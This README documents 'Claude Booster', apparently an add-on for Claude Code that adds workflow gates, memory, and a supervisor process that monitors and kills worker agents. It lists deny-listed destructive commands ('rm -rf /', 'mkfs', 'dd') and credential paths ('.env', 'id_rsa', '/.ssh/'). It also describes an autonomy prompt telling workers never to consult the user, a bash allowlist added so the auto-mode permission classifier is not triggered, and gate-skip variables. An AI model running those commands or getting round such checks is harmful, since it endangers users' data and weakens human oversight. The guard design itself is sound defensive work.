**The problem this release solves.** Claude edits functions without understanding the dependency graph. It fixes function A but breaks B, C, D that depend on A. It patches data in the database directly instead of fixing the function that produced the bad data in the first place. Across sessions, it loses track of what connects to what — there's no "circuit board" showing the system topology. The session ends, open threads are forgotten, and the next session starts with no record of the half-finished work.

**What v1.5.0 changes.** Three layers of systemic thinking enforcement — architecture as code, gate-level blocking, and workflow integration:

### Layer 1 — Architecture as Code

**`ARCHITECTURE.md`** — a codebase map generated (and auto-refreshed) from the real code, not from memory. Contains Mermaid C4 diagrams for each layer, dependency tables (what calls what, what writes to what), data flow diagrams, and explicit system invariants. Not a doc you write once and forget — a living artifact updated by the pipeline.

**`dep_manifest.json`** — machine-readable companion to `ARCHITECTURE.md`, consumed by hooks in under 5ms. Lists critical files, their dependents, and dependency-review requirements. This is what the guards read to decide whether to block an edit.

**`ADR-TEMPLATE.md`** — Architecture Decision Record template with a mandatory "What NOT to change" section. Enforces that every significant decision explicitly documents its blast radius.

### Layer 2 — Three new enforcement gates

**`financial_dml_guard.py`** — blocks `UPDATE`/`DELETE` on protected database tables. Derived-readonly columns (fields whose value must come from the producer function, not be patched directly) and append-only tables (audit logs, ledger entries) are declared in config; the guard refuses direct DML against them. The message is explicit: "fix the producer function, not the data."

**`dep_guard.py`** — blocks `Edit`/`Write` on critical files unless the current session transcript shows evidence of dependency review. If you're about to touch a function listed in `dep_manifest.json` as high-dependency, the guard checks that you ran the review step first. No evidence = blocked.

**`arch_freshness.py`** — warns (non-blocking, by design) when source files change but `ARCHITECTURE.md` hasn't been updated in the same session. Keeps the map from drifting silently.

**`require_task.py` extension** — validates that `TaskCreate` descriptions contain structured impact fields: `affected:`, `dependencies:`, `impact:`, `dependents:`. A task that doesn't state its blast radius can't be opened.

### Layer 3 — Two new slash commands

**`/architecture`** — generates `ARCHITECTURE.md` and `dep_manifest.json` from live codebase analysis. Uses a Map-Reduce pattern: 4 parallel Haiku agents each MAP one layer (database schema, API layer, business logic, external integrations), then 1 Sonnet Architect REDUCES them into a connected system map with cross-layer dependency edges. Supports `--update` for incremental refresh when only part of the system changed.

**`/debt`** — tracks session debts: work items that were identified but not completed before the session ended. `/debt list` shows the inventory, `/debt work` picks the highest-priority item and starts implementing it, `/debt review` formats the current debt list for inclusion in the handover report. Debts survive session resets; the next session picks up where this one left off.

### Pipeline integration

- **`/start`** now reads `ARCHITECTURE.md` and `dep_manifest.json` as mandatory context. If neither exists, it suggests running `/architecture` before any code edits.
- **Paired verification** gains an `Affected downstream:` field in the Artifact Contract — Verifier tests must cover at least one downstream consumer of the changed interface.
- **Post-VERIFY** spawns a background agent that auto-updates architecture docs when interfaces change (new endpoints, renamed functions, schema diffs).
- **`/handover`** now includes a `## Outstanding Debts` section populated by `/debt review` — the next session sees the open threads before it sees the code.

**Quick start:**
```bash
# Generate architecture docs for any project
/architecture

# See what work is left unfinished
/debt list

# Pick the highest-priority debt and work it
/debt work

# Include debts in the handover
/debt review
```

**Consilium-driven design.** This release was designed by a 6-agent consilium: Systems Architect, Financial Engineer, Tooling Engineer, Process Consultant, GPT-5.5 external validation, and user input. The decision report is at `reports/consilium_2026-05-04_systemic_thinking.md`. Key rejected alternatives: auto-generated AST dependency graphs (too noisy, miss DB-mediated dependencies that don't appear in import graphs), Figma for architecture diagrams (rate-limited, not version-controlled, can't be read by hooks), full DML block on all tables (60–70% miss rate — too many legitimate admin paths hit it).

---

## What's new in v1.4.0 — Session Context for Agents

**The problem this release solves.** When a Worker agent fails and Lead re-spawns a new one, the retry agent starts blind — it doesn't know what the predecessor tried, what errors it hit, or what approaches were already ruled out. Lead's summary is lossy (Data Processing Inequality: each hop through an agent boundary is a lossy codec). The retry agent ends up repeating the same failed approach, burning tokens and time.

**What v1.4.0 changes.** Agents can now read the raw session history — their own Lead's conversation, or any specific subagent's JSONL — via `session_context.py`. The tool extracts readable conversation from Claude Code's session files: dialogue, code edits (Edit/Write diffs with full old→new content), Bash commands + results, and agent spawns. Hook noise, permission modes, and file-history snapshots are stripped.

**Key insight: whose context matters.** On retry, the new Worker needs the *failed agent's* session, not Lead's. The failed agent saw stack traces, tried approaches, hit edge cases. Lead only saw the summary. The rules now explicitly distinguish:

| Trigger | Whose context | Command |
|---|---|---|
| Retry after Worker failure | Failed agent's | `--agent "<Worker desc>" --no-thinking` |
| Debug chain (2+ attempts) | Failed agent's | `--agent "<prev Worker>" --grep "<symptom>"` |
| Discussion back-reference | Lead's | `--tail 15 --no-thinking` |
| Decision context (why X) | Lead's | `--grep "<topic>" --no-thinking` |
| Self-audit of session edits | Lead's | `--tools-only --grep "Edit\|Write"` |

**Subagent discovery.** Each Lead session stores subagent JSONLs in `<session-id>/subagents/` with `.meta.json` metadata. `--subagents` lists all agents of a session (description, size, time). `--agent "<keyword>"` reads a specific agent by description or ID prefix.

```bash
# List all agents spawned in the current session
python3 ~/.claude/scripts/session_context.py --subagents

# Read what the failed Worker tried
python3 ~/.claude/scripts/session_context.py --agent "Worker: fix reconcile" --no-thinking

# Lead's last 10 conversation turns for context
python3 ~/.claude/scripts/session_context.py --tail 10 --no-thinking

# Only code edits from the session
python3 ~/.claude/scripts/session_context.py --tools-only --grep "Edit|Write"
```

**Integration with paired-verification.** The Artifact Contract gains an optional `Session context:` field. Decision rules in `paired-verification.md` §Session context injection specify when to include it and whose context to pass. On retry (W/V/A/E failure classification → re-spawn), Lead automatically includes the failed agent's session in the new Worker's brief.

---

## What's new in v1.3.0 — Command architecture + Supervisor UX

**Three problems this release solves:**

1. **`/supervise` naming conflict.** A third-party plugin intercepted the `/supervise` command prefix. Renamed to `/lead` — same supervisor engine, no collision. All rules, README, and delegate references updated.

2. **Long-prompt crash.** The supervisor passed prompts as CLI arguments (`args += [prompt]`), which broke on prompts >100KB with "chunk is longer than limit". Fix: prompt is now written to a tempfile and fed via stdin to the `claude` subprocess.

3. **No model routing for supervised workers.** `supervisor.py` had no `--model` flag — model was only configurable via `CLAUDE_BOOSTER_MODEL` env var. Now: `/lead --model claude-sonnet-4-6 "your task"` works directly.

**Additional changes:**

- **Coding/implementation tier** in `tool-strategy.md` — Worker agents that write code route to `model: "sonnet"` by default. For `/lead`, use `--model claude-sonnet-4-6` explicitly.
- **Command files extracted** from `rules/commands.md` — `/start`, `/handover`, `/consilium` are now standalone files in `commands/`. Saves ~3000 tokens per session (command instructions load on-demand, not always-on).
- **Template sync** — `templates/rules/tool-strategy.md` now matches the installed version (model routing section was previously missing).

### `/lead` command

```bash
# Same as old /supervise, new name:
/lead fix the bug in foo.py

# With explicit model:
/lead --model claude-sonnet-4-6 implement the feature from spec.md

# Inspect state:
/lead sessions
/lead status --session <id>
/lead decisions --session <id>
```

---

## What's new in v1.2.0 — Supervisor Agent

**The problem this release solves.** v1.1.0 gave Claude a phase state machine and hook-enforced gates. That's good for one worker. But once you hand a long-running task to Claude and step away for coffee, there's no second opinion watching what the worker actually does: did it try a `git push --force` at 2am? Did it silently retry the same failing tool call 40 times in a loop? Did it hit a `/.env` Read the policy should have caught? Stock Claude Code answers all three with "check the transcript tomorrow."

**What v1.2.0 changes.** The supervisor is a second Python process that spawns a `claude -p --output-format stream-json` worker, observes every tool invocation on the worker's stream, and **kills the worker the instant a policy violation or quota breach occurs**. Three layers:

1. **Permissive-blacklist policy engine** (`policy.py`). Worker is **trusted by default** — Bash/Edit/Write/Read/Grep/Glob all approve unless they hit one of 13 hard-deny Bash regexes (`git push --force`, `rm -rf /`, `kubectl delete`, `dd`, `mkfs`, …) or one of 11 hard-deny path substrings (`.env`, `id_rsa`, `/.aws/`, `/.ssh/`, `/.git/config`, …). Set `paranoid_mode: true` in `<repo>/.claude/supervisor.yaml` to flip the default back to whitelist-only for high-trust-boundary projects.
2. **Adaptive silence detector** (`detector.py`). `clamp(3 × median_event_gap, 20s, 180s)` with a 60s post-start grace. A hung or deadlocked worker gets cancelled automatically — no infinite stall, no infinite spend.
3. **Quota admission control** (`quota.py`). 15% supervisor reserve carved out of the 5-hour Max/Pro window. Circuit-breaker `CLOSED → HALF_OPEN (≥50% usage) → OPEN (≥85%)`. Pre-spawn admission check refuses workers that would blow the session cap.
4. **Auto-continuation on `max_turns`**. The Claude CLI has an internal turn limit (~25 turns per `-p` invocation). On long multi-file research or multi-step fixes, vanilla `claude -p` just stops mid-task with `error_max_turns`. The supervisor catches that, re-spawns the worker with `--resume <cli_session_id>` and a "continue where you left off" prompt, and stitches the chain together transparently — up to `max_continuations` (default 5) per session. Users write one prompt; the supervisor handles the chaining. Policy + quota + silence detection stay session-wide. Circuit-breaker still trips if cumulative spend blows the 5-hour budget.
5. **Autonomy directive + auto permission mode**. Every worker is spawned with `--permission-mode auto` (so permission prompts don't stall the subprocess) AND an `--append-system-prompt` that reads: *"Work fully autonomously. Do NOT ask the user clarifying questions or offer A/B choices. If you face a decision, pick the best path using reversibility + scope + risk and proceed."* This is the directive that converts `/lead` from "another Claude session that falls back to admin mode" into actual autonomous execution. Disable per-repo via `autonomy_directive: false` in supervisor.yaml if you want the worker to behave like a vanilla interactive session.

Enforcement is **authoritative, not advisory**: any `deny`, `escalate-without-escalator`, `loop-guard`, `blocked-by-quota` verdict triggers `SIGINT → SIGTERM → SIGKILL` on the worker and records the decision to `rolling_memory.db.supervisor_decisions` before the worker can finish the tool call.

### `/lead` command

```bash
# One-shot supervised worker session (prompt + cancel-on-violation).
# No `run` keyword, no quote marks needed — everything after the script
# path is the worker prompt:
python3 ~/.claude/scripts/supervisor/supervisor.py fix the bug in foo.py

# Recent decisions for a session:
python3 ~/.claude/scripts/supervisor/supervisor.py decisions --session <id> --limit 20

# Quota snapshot (5h window, circuit state, tokens spent):
python3 ~/.claude/scripts/supervisor/supervisor.py status --session <id>
```

Also available as `/lead <args>` from inside a Claude Code session — the slash command wraps the same CLI, and `install.py` auto-allowlists the bash pattern so you don't hit the auto-mode classifier on first try.

### Per-project config

`<repo>/.claude/supervisor.yaml` (parsed by a minimal flat-YAML reader; pre-materialise to `supervisor.json` if you need anything fancy):

```yaml
tier1_tools:
  - pytest
tier2_trusted_repo: false
estimated_tokens: 10000
```

### What lands in `rolling_memory.db`

Two new tables, both with `CHECK` constraints at the DB level:

| Table | What it holds |
|---|---|
| `supervisor_decisions` | One row per observed tool-use: `session_id`, `ts`, `tool`, `args_digest` (SHA-256 for loop detection), `decision ∈ {approve,escalate,deny}`, `tier`, `rationale`, `approved_by ∈ {regex,haiku,dmitry}` |
| `supervisor_quota` | One row per session: `session_id`, `started_at`, `window_end`, `supervisor_tokens`, `worker_tokens`, `circuit_state`, `updated_at` — survives supervisor restart |

### What's still v1.2.0-MVP (call-out for honesty)

- **No Haiku escalator wired by default** — `policy.escalate` + no escalator = default-deny + cancel. If you want Haiku-as-gatekeeper, implement the `HaikuEscalator` Protocol in `supervisor.py` and inject at `Supervisor(...)` construction; the system prompt already lives at `~/.claude/scripts/supervisor/prompts/supervisor_v1.md` (contract: JSON-only reply with `{"decision":"approve|deny", "rationale":"..."}`).
- **One worker per supervisor** — multi-worker session pooling is Session 5+.
- **End-to-end red-team against the real `claude-agent-sdk` worker binary is documented but not automated** — the 92-test unit/integration suite exercises the full chain via `FakeProc`, and Session 4's live smoke (hi → completed; `use bash ...` → cancelled + deny-decision persisted) proved the enforcement loop works against the real binary. A CI-pinned matrix across RT1–RT5 is the next roadmap item, not a ship-gate.

---

## What's new in v1.1.0 — Lead-Orchestrator workflow enforcement

**The problem this release solves.** v1.0 gave Claude *instructions* on how to work as a lead orchestrator: RECON first, plan second, verify before closing, never push unverified code. Those instructions are in `pipeline.md` and Claude reads them every session. It still skipped steps — because instructions without teeth decay into theater the moment a task gets urgent. "I'll just edit this one file" becomes a habit, plans never get written, tasks close without anyone running a single `curl`.

**What v1.1.0 changes.** The workflow is now enforced by the harness, not by Claude's memory. A six-phase state machine (`RECON → PLAN → IMPLEMENT → AUDIT → VERIFY → MERGE`) lives in `<project>/.claude/.phase`, visible in every prompt, and `PreToolUse` / `TaskCompleted` / `PreCompact` hooks **physically refuse** tool calls that violate the current phase:

- Try to `Edit` a `.py` file in `RECON`? Blocked with a message telling Claude to advance the phase first.
- Try to close a `TaskUpdate(status=completed)` without a `curl`, `pytest`, `SELECT ... N rows`, or DevTools inspection in the transcript? Blocked.
- Auto-compaction tries to fire mid-plan and summarize away the architecture discussion? Blocked.
- `git push --force`, `rm -rf /`, `kubectl delete`, `dd`, `mkfs`? Refused even with `bypassPermissions`.

Plus two Claude-4.7-specific env defaults: `MAX_THINKING_TOKENS=12000`, `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=80`. (The `effortLevel: high` override was removed in v1.13 — Claude Code now defaults to `high` for Max subscribers. Users on Opus 4.7 can set `xhigh` for an intermediate tier between `high` and `max`.)

Full lever map:

| Lever | Behaviour |
|---|---|
| `/phase` slash command + per-project `.claude/.phase` file | Six phases: `RECON → PLAN → IMPLEMENT → AUDIT → VERIFY → MERGE`. Transitions logged to `phase_transitions.log`. |
| `phase_gate.py` PreToolUse hook | Blocks `Edit`/`Write`/`NotebookEdit` on source code unless phase = `IMPLEMENT`. Docs / reports / tests / `*.md` still editable in any phase. |
| `phase_prompt_inject.py` UserPromptSubmit hook | Injects `[phase: X] <rule>` into every user prompt so Claude always sees the current gate. |
| `require_task.py` PreToolUse hook | Blocks code edits without an active `TaskCreate` — enforces plan-first discipline. |
| `require_evidence.py` TaskCompleted hook | Refuses to close a task without `curl`/`pytest`/`SELECT ... N rows`/DevTools output in recent transcript. Bypass via `docs:`/`chore:` task prefix. |
| `preserve_plan_context.py` PreCompact hook | Blocks auto-compaction while phase = `PLAN` so architectural discussion isn't summarized mid-design. |
| `permissions.deny` hardening | `git push --force`, `git reset --hard`, `rm -rf /`, `kubectl delete`, `docker system prune`, `dd`, `mkfs` refused even in `bypassPermissions` mode. |
| `MAX_THINKING_TOKENS=12000` | Extended thinking budget for complex reasoning chains. (`effortLevel` removed — CC now defaults to `high`; set `xhigh` in settings for Opus 4.7 intermediate tier.) |
| `ANTHROPIC_DEFAULT_OPUS_MODEL=claude-opus-4-7` | Pins Opus 4.7; session doesn't silently fall back to 4.6. |
| `CLAUDE_AUTOCOMPACT_PCT_OVERRIDE=80` | Compaction triggers at 80 % instead of the default ~95 % — planning context isn't lost at the edge. |

Escape hatches for legitimate exceptions: `CLAUDE_BOOSTER_SKIP_{TASK,PHASE,EVIDENCE,COMPACT}_GATE=1`.

---

## Before / After

| Daily scenario | Stock Claude Code | With Claude Booster |
|---|---|---|
| **New session starts** | Reads `CLAUDE.md`, asks what changed since yesterday | `/start` auto-loads last session's decisions + relevant prior consiliums/audits — scoped to the current project, biased by category |
| **Finished a hard debugging session** | Wisdom evaporates when you close the laptop | `/handover` captures decisions, Goal+KPI, Required reading list, and session transcript reference. Next session reads exactly what it must before touching code |
| **Moving to a new project** | Zero context carry-over | FTS5 cross-project search surfaces relevant lessons from every other project you've worked on |
| **"Which approach do you want?"** | Claude asks, you tie-break, lose a round-trip | **51% Rule**: Claude acts on best guess, states the assumption in one line, you course-correct only if wrong |
| **Hook silently broken** | Discovered 3 weeks later when something "feels weird" | `check_rules_loaded.py` canary + `telemetry_agent_health.py` surface 5 anti-theater signals every `/start` |
| **Architectural decision** | Lost in terminal scrollback | `consilium` spawns 3–5 bio-specific agents + GPT via PAL MCP, auto-saves to `reports/`, auto-indexed for retrieval |
| **"Did I run the tests?"** | Honor system | `verify_gate.py` PreToolUse hook blocks handover commits without an evidence JSON block |
| **Hand-off between sessions** | "read the chat log" | Structured `handover` with Goal+KPI (north star + measurable KPI), Required reading (files the next session must read before acting), Session reference (JSONL transcript path for RECON), verify-gate evidence |
| **Next session starts blind on goal** | North star and KPI only exist in your head | `## Goal + KPI` section in every handover — north star + current milestone + KPI, carried forward or updated each session |
| **Next session reads wrong files first** | No mandatory context list | `## Required reading` section — bulleted list of files with reasons; `/start` reads them before anything else |
| **"What did we actually try last time?"** | Buried in terminal history, gone by morning | `## Session reference` in handover — UUID + JSONL path; grep the transcript during RECON to understand what failed and why |
| **`CLAUDE.md` bloated to 500 lines** | Everything loaded on every prompt | 11 scoped rules — `paths:` filtering, description-gated loading, always-on kept minimal |
| **Claude re-implements existing code** | No recon-before-code rule | `core.md` enforces Grep-first; auto-consilium fires on high-risk edits |
| **Same bug class hits you 3 times** | Fix → forget → repeat | Error-taxonomy classifier promotes recurring patterns into `institutional.md` as permanent rules |
| **Agent writes code, Lead says "looks good"** | Self-evaluation bias — Lead authored the brief, naturally sees the result as matching | Тройка: Flow Designer maps failure modes → Worker implements → independent Verifier writes executable test. Exit code = verdict, not Lead's opinion |
| **Same bug resurfaces every 3 sessions** | No causal memory — each session re-discovers and re-proposes the same fix | Temporal-causal 3D memory: stuck-loop detector hashes topics across handovers, forces reframe (Q1–Q4) when pattern detected |
| **Every agent runs on Opus, session takes 10 min** | No model routing — all delegates inherit the Lead's expensive model | 4-tier routing: Haiku for lookups, Sonnet for coding, Opus only for architecture. 2-4x faster, 3-5x cheaper per delegation |
| **Retry agent makes the same mistake** | No knowledge of what predecessor tried or why it failed | `session_context.py` lets retry agents read the failed Worker's raw session — stack traces, attempted edits, error messages — instead of Lead's lossy summary |
| **Claude fixes A, breaks B, C, D** | No dependency map — edits happen without tracing the call graph | `dep_guard.py` blocks edits on critical files without dependency review evidence + `ARCHITECTURE.md` circuit board shows the full system topology |
| **Claude patches DB data directly** | No gate on DML — broken data gets fixed in the DB instead of in the producer | `financial_dml_guard.py` blocks `UPDATE`/`DELETE` on derived columns and append-only tables, forces "fix the producer function, not the data" |
| **Session ends, debts forgotten** | No tracking of unfinished work — next session starts blind | `/debt` tracks the inventory, `/debt work` resolves highest-priority items, `/handover` includes `## Outstanding Debts` so context survives the reset |
| **"Code review" = Claude reads the diff once** | Single-agent self-review — same model that wrote the code judges it | `/audit` spawns 6 specialized agents (security, performance, correctness, architecture, data integrity, ops) + GPT external review — each does independent RECON with mandatory grep patterns |
| **`git status` blocked after first Bash call** | delegate_gate counts all Bash equally — diagnostic commands consume the same budget as destructive ones | `RECON_BASH_PATTERNS`: 8 read-only patterns (git, ssh, curl, ls, docker ps, .claude/scripts/*) exempt from budget — only write-intent Bash counts |

---

## Pain → Fix map

| Pain | Root cause | Booster fix |
|------|-----------|-------------|
| Claude forgets everything between sessions | No persistent memory layer | `rolling_memory.db` (SQLite + FTS5), ~1900-LOC memory engine, SessionStart hook injects relevant context under a token budget |
| Every project starts at zero | No cross-project knowledge transfer | `/start` pulls cross-project consilium/audit rows, category-biased ORDER BY, topic-driven FTS5 search |
| Clarifying-question spam | No confidence threshold | `core.md` 51% Rule — act on best guess, state assumption in one line |
| `CLAUDE.md` monolith | One big file loaded always | 11 scoped files in `~/.claude/rules/` — frontmatter `paths:` or `description:` gating |
| Decisions lost | No structured save | `consilium` / `audit` / `handover` protocol, auto-indexed for retrieval |
| Hooks broken silently | No self-check | `check_rules_loaded.py` canary + 5-signal agent-health telemetry |
| "Fake evidence" in commits | No verification gate | `verify_gate.py` PreToolUse hook — blocks handover commits without real curl/SQL/HTTP evidence markers |
| Session ends, notes scattered | No handover contract | `/handover` auto-collects git log + roadmap delta; requires Goal+KPI, Required reading, Session reference — structured report that next session can act on, not just read |
| Next session drifts off the goal | KPI only lives in the current session | `## Goal + KPI` in handover is persistent — copy-forward each session, update only when milestone changes; goal survives context resets |
| Post-mortem impossible: "what did we try?" | Session transcript unreachable | `## Session reference` links the JSONL transcript; RECON agent can grep it for tried approaches, failure modes, rejected alternatives |
| Personal install breaks on new machine | Manual copy of `~/.claude/` | `install.py` — one command, atomic, idempotent, safe by default |
| Worker loops on a failing tool call at 2am, burns quota | No watchdog | v1.2.0 Supervisor Agent — `policy.py` + `detector.py` + `quota.py`, SIGINT-ladder-cancels worker on deny / silence / quota breach |
| Agent self-evaluates its own work | Same model writes and reviews — bias | Тройка pipeline (`/go`): Flow Designer + Worker + independent Verifier, exit code = verdict, `go_gate.py` enforces the pattern |
| Same problem loops across sessions | No causal chains in memory | Temporal-causal 3D memory + stuck-loop detector, hash-based recurrence detection |
| Slow agents burn Opus budget | All delegates on Opus 4.7 | 4-tier model routing (Haiku/Sonnet/Opus) + `/fast` mode for coding agents |
| Retry agent repeats same failed approach | No access to predecessor's session history | `session_context.py --agent "<failed Worker>"` — retry reads the raw JSONL of the failed agent, sees what was tried |
| "What did the agents do?" | Subagent sessions buried in filesystem | `session_context.py --subagents` lists all agents (description, size, time); `--agent <keyword>` reads any one |
| Edit A silently breaks B, C, D | No dependency map — changes land without tracing the call graph | `dep_guard.py` checks session transcript for dependency review evidence before allowing edits on high-dependency files; `ARCHITECTURE.md` + `dep_manifest.json` make the circuit board explicit |
| Claude patches DB data instead of the producer | No DML gate — data inconsistency "fixed" at the storage layer | `financial_dml_guard.py` blocks direct `UPDATE`/`DELETE` on derived-readonly columns and append-only tables with a clear redirect message |
| Session ends, open work lost | No debt tracking — next session starts from scratch | `/debt list` inventories unfinished items; `/debt work` picks and resolves; `/handover` injects `## Outstanding Debts` for the next session |
| Code audit = one agent reading alone | "Audit" triggers single-reviewer mental model; no multi-perspective review | `/audit`: 6-lens parallel agents + PAL external, independent RECON per lens, structured verdicts with evidence |
| `git status` / `ssh` / `curl` blocked by delegate gate | All Bash counted equally — read-only diagnostic commands consume same budget as writes | `RECON_BASH_PATTERNS`: 8 regex patterns exempt read-only Bash (git, ssh, curl, ls, docker ps, scripts) — free like Read/Grep |

---

## 60-second quickstart

```bash
git clone https://github.com/demetrius2017/claude-booster
cd claude-booster
python3 install.py --dry-run                                   # preview every change
python3 install.py --yes --name "Your Name" --email "you@example.com"
```

That's it. Your next Claude Code session reads the new `~/.claude/rules/`, the memory engine boots, hooks wire themselves in. Zero config files to edit by hand.

To try the v1.2.0 supervisor on a real worker:
```bash
python3 ~/.claude/scripts/supervisor/supervisor.py your prompt here
```
or from inside a Claude Code session: `/lead your prompt here` (no `run`, no quotes needed). Decisions land in `~/.claude/rolling_memory.db` (`supervisor_decisions` + `supervisor_quota` tables), stderr in `~/.claude/logs/supervisor/worker_*.stderr.log`.

**Prerequisite for `/lead`**: the `claude` CLI must be on PATH. The installer warns if it isn't, but the rest of Booster (memory, phase machine, rules, `/start`/`/handover`/`/consilium`) works without it.

**Staying up-to-date.** `install.py` records the source repo's `repo_path` / `git_sha` / `git_branch` into the manifest. A SessionStart hook (`check_booster_update.py`) runs on every Claude Code session start: it `git fetch`es the booster repo and, if origin is ahead, injects an `additionalContext` notice telling Claude "N commits behind, run `cd <repo> && python3 install.py --yes` to update". For fully-autonomous updates, export `CLAUDE_BOOSTER_AUTO_UPDATE=1` — the hook runs the installer itself and reports the outcome. Offline / no git / tar-extracted install = silent no-op.

Supported: **macOS (Apple Silicon + Intel) · Ubuntu · Debian · Fedora · Arch · Alpine · WSL2**. Native Windows, WSL1, Snap/Flatpak-sandboxed Claude Code, and `~/.claude/` on a network filesystem are **refused at preflight with actionable errors** — no silent misinstalls.

---

## What you actually get

Under `~/.claude/`:

| Path | Content |
|------|---------|
| `rules/*.md` | 12 rule files — anti-loop, tool strategy, pipeline phases, deploy procedures, frontend debug pipeline, institutional knowledge, error taxonomy, canary for rule-load detection, communication-style ("professor" tone), quality/Three-Nos, paired-verification (with session context injection protocol) |
| `scripts/*.py` | 25+ Python hook scripts — memory engine + session hooks (`rolling_memory.py`, `memory_session_start.py`/`_end.py`/`_post_tool.py`), тройка enforcement (`go_gate.py`, `delegate_gate.py`), evidence gates (`verify_gate.py`, `require_evidence.py`), phase machine (`phase.py`, `phase_gate.py`, `phase_prompt_inject.py`, `preserve_plan_context.py`), plan-first enforcer (`require_task.py`), model routing (`model_balancer.py`, `model_metric_capture.py`, `model_tag_enforcer.py`), observability (`telemetry_agent_health.py`, `check_rules_loaded.py`, `check_review_ages.py`, `compact_advisor.py`), session context extractor (`session_context.py`), systemic thinking guards (`financial_dml_guard.py`, `dep_guard.py`, `arch_freshness.py`), infra (`index_reports.py`, `backup_rolling_memory.py`, `add_frontmatter.py`, `codex_worker.sh`, `codex_sandbox_worker.sh`) |
| `scripts/supervisor/` | v1.2.0 Supervisor Agent — 8 modules (`supervisor.py` CLI + orchestration, `policy.py` Tier 0/1/2 engine, `quota.py` admission + circuit-breaker, `detector.py` adaptive-silence FSM, `stream_json_adapter.py` Path A runtime, `persistence.py` sqlite writers, `runtime.py` transport Protocol, `schema.sql`) + `prompts/supervisor_v1.md` Haiku escalation contract |
| `commands/*.md` | 13 slash commands: `/go`, `/start`, `/handover`, `/consilium`, `/audit`, `/lead`, `/update`, `/phase`, `/delegate`, `/verify-after-edit`, `/verify-flow`, `/architecture`, `/debt` |
| `agents/*.md`, `*.json` | Agent team protocols — lifecycle, ownership schema, worktree safety, readiness gates, roadmap convention |
| `settings.json` | Hooks wired to Claude Code, **merged** into any existing config |
| `.booster-manifest.json` | Installer metadata — SHA-256 per file, version, for idempotency and selective rollback |
| `.booster-config.json` | Your git author identity (used for rule-template substitution) |
| `backups/booster_install_*.tar.gz` | Rollback tarball captured before any mutation |

### Slash commands

All commands are on-demand — their instructions load only when you invoke them, saving ~3000 tokens per session compared to the pre-v1.3.0 monolithic approach.

| Command | What it does |
|---------|-------------|
| `/go` | **The тройка pipeline in one command.** Validates Artifact Contract → spawns Flow Designer (Opus) → spawns Worker + Verifier (Sonnet, parallel) → runs test → exit code = verdict. Built-in W/V/A/E retry classification. `go_gate.py` enforces this for all coding during IMPLEMENT. |
| `/start` | Initialize a session: read README, last handover, knowledge base (FTS5 cross-project search), telemetry, canary check, stuck-loop detection. Ends with `EnterPlanMode`. |
| `/handover` | End-of-session report: auto-collects git log, saves structured report with Goal+KPI, Required reading, Session reference, verify-gate evidence block. |
| `/consilium` | Multi-agent debate: RECON first (code, not reports), spawn 3–5 bio-specific agents + GPT via PAL MCP, synthesize positions, save to `reports/`. |
| `/audit` | Multi-agent code audit: 6 specialized lenses (correctness, security, performance, architecture, data integrity, operational) + PAL external review. Each auditor runs independent RECON. Structured PASS/FAIL/CONCERN verdicts with file:line evidence. |
| `/lead` | Supervised worker: spawns a `claude -p` subprocess under policy gating (Tier 0/1/2 deny-list), quota circuit-breaker, adaptive silence detection. Replaces old `/supervise`. |
| `/update` | Mid-session auto-update: `git pull --ff-only` + `install.py --yes`. Rules and commands hot-reload immediately. Dirty tree = abort. |
| `/phase` | Show or set workflow phase (`RECON → PLAN → IMPLEMENT → AUDIT → VERIFY → MERGE`). |
| `/delegate` | Inspect the delegate-gate budget (Lead must delegate, not do inline work). |
| `/verify-after-edit` | Post-edit UI verification via Chrome DevTools. |
| `/verify-flow` | End-to-end UI flow verification. |
| `/architecture` | Generates `ARCHITECTURE.md` + `dep_manifest.json` from codebase analysis. Map-Reduce: 4 Haiku explorers map each layer (DB, API, business logic, integrations), 1 Sonnet architect reduces into a connected system map. Supports `--update` for incremental refresh. |
| `/debt` | Tracks session debts (unfinished work items). `/debt list` shows inventory, `/debt work` picks highest priority and starts implementing, `/debt review` formats for handover inclusion. |

### Speed & model routing

See [Three quality innovations → Smart model routing](#3-smart-model-routing--fast-agents-without-extra-cost-on-max) above for the full breakdown. Quick reference:

| Tier | Model | Use case |
|------|-------|----------|
| Trivial | Haiku 4.5 | Grep, file lookup, path search, simple regex |
| Coding / Medium | Sonnet 4.6 | Code generation, research, test writing, reviews |
| Hard | Opus 4.7 | Architecture, security review, deep debugging, consilium |

For supervised workers (`/lead`), pass `--model` explicitly:
```bash
/lead --model claude-sonnet-4-6 implement the feature from spec.md
```

**Claude Max:** model routing (Haiku/Sonnet/Opus) is included in the subscription. **Fast mode is extra usage — $30/$150 MTok, billed separately.** Enable with `/fast` when needed. **API plans:** model routing saves money (cheaper models for delegates), but budget total token spend.

---

## Safety contract

The installer is **conservative by default**. It explicitly protects:

- **NEVER touched**: `rolling_memory.db` (your memory), `history.jsonl`, `.credentials.json` (Claude Code OAuth), `projects/`, `plugins/`, `cache/`, `sessions/`, `file-history/`, `logs/`, `paste-cache/`, `image-cache/`, `chrome/`, `ide/`, `debug/`, `plans/`, `downloads/`, `scheduled-tasks/`, `backups/`, `session-env/`.
- **Atomic writes**: every file via tmp + `fsync` (+ `F_FULLFSYNC` on Darwin) + `os.replace`. No partial state possible.
- **User-modified files preserved**: if your existing `rules/*.md` or scripts differ from the shipped template AND weren't written by a prior Booster install, they are preserved. Pass `--force` to overwrite.
- **Backup before any write**: staged in `$TMPDIR`, finalized to `~/.claude/backups/booster_install_<UTC>.tar.gz` after a successful install. Restore with:
  ```bash
  tar xzf ~/.claude/backups/booster_install_*.tar.gz -C ~/
  ```
  Selective restore (e.g. only rules):
  ```bash
  tar xzf ~/.claude/backups/booster_install_*.tar.gz -C ~/ .claude/rules
  ```
  If an install failed mid-flight and the final copy never ran, the backup is still at `$TMPDIR/booster_install_<UTC>.tar.gz` (macOS: `/var/folders/.../T/`; Linux: `/tmp/`).
- **`settings.json` merged by namespace**: installer owns only entries tagged `"source": "booster@<version>"` + the top-level `_booster` key. Your `permissions.allow`, `additionalDirectories`, `enabledPlugins`, `env`, `mcpServers` (incl. auth tokens) are preserved verbatim.
- **Secrets redacted in `--dry-run`**: diff shows `***REDACTED***` for any key matching `token|key|secret|password`.
- **Interrupt-safe**: Ctrl+C triggers rollback from the backup tarball, exits 130.

---

## CLI

```
python3 install.py [flags]

--dry-run        Preview changes. No writes.
--yes            Skip confirmation prompt (non-interactive).
--force          Overwrite user-modified files.
--name NAME      Git author name (substituted into rule templates).
--email EMAIL    Git author email.
--version        Print version and exit.
```

### Exit codes

| Code | Meaning |
|------|---------|
| 0 | success / dry-run OK |
| 10 | Python < 3.8 |
| 11 | `~/.claude/` not writable |
| 12 | Downgrade attempt (manifest newer than installer) |
